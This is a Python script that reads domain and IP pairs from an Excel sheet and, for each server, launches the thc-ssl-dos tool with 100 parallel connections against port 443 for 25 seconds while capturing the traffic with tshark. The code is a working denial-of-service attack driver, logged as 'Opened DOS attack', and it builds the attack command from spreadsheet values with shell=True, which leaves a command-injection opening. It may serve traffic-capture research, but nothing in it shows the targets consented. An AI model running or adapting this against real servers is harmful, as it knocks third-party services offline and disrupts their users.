# This script is used to get data from excel dos traffic to input to a linux machine
import os
import pandas as pd
import datetime
import socket
import logging
import subprocess
import time
import signal

logging.basicConfig(filename='dos_traffic.log', level=logging.INFO, format='%(asctime)s-%(levelname)s-%(message)s')

excel_dir = "./report_unique_servers2.xlsx"
df = pd.read_excel(excel_dir, sheet_name="thc-tls-dos")

dictionary = {}
ip_list = df['IP']

# Initializing the dictionary to be able to retrieve the names easily
for index, row in df.iterrows():
    domain = row['Domain']
    ip = row['IP']

    dictionary[ip] = domain

logging.basicConfig(filename='dos_traffic.log', level=logging.INFO, format='%(asctime)s-%(levelname)s-%(message)s')


file_path = os.path.join("output/dos_traffic/" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))
if not os.path.exists(file_path):
    os.makedirs(file_path)


# For each website: resolve the IP address to add into kali-linux thc-ssl-dos
for ip in ip_list:
    # Initializer for tshark
    # SNIFFER
    # Declaring variables for the sniffer
    # Capture filter ip_list[0] is taken as the first IP resolved to capture
    # Might not be too perfect in the case
    logging.info('Currently testing ' + ip)
    abspath = os.path.abspath(file_path)
    interface = "eth0"
    capture_filter = "tcp port 443 and host " + ip
    filename = abspath + "/" + dictionary[ip] + "_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".pcap"

    # Raw capturing
    sniff_command = ["tshark", "-i", interface, "-c 5000", "-f", capture_filter, "-w", filename]
    sniff_process = subprocess.Popen(sniff_command, shell=False)
    logging.info("Opened tshark sniffer")

    # Initializer for thc-ssl-dos
    # Declaring variables for thc-ssl-dos
    parallel_connections = 100
    port = 443

    thc_command = "thc-ssl-dos -l " + str(parallel_connections) + " " + ip + " " + str(port) + " " + "--accept"
    GNULL = open(os.devnull, 'w')
    thc_process = subprocess.Popen(thc_command, shell=True, stdout=GNULL)
    logging.info("Opened DOS attack")

    # Sleeping for 25 seconds before killing them off
    time.sleep(25)
    kill_thc = "killall -s SIGTERM thc-ssl-dos"
    kill_sniff = "killall -s SIGTERM  tshark"
    os.system(kill_thc)
    os.system(kill_sniff)

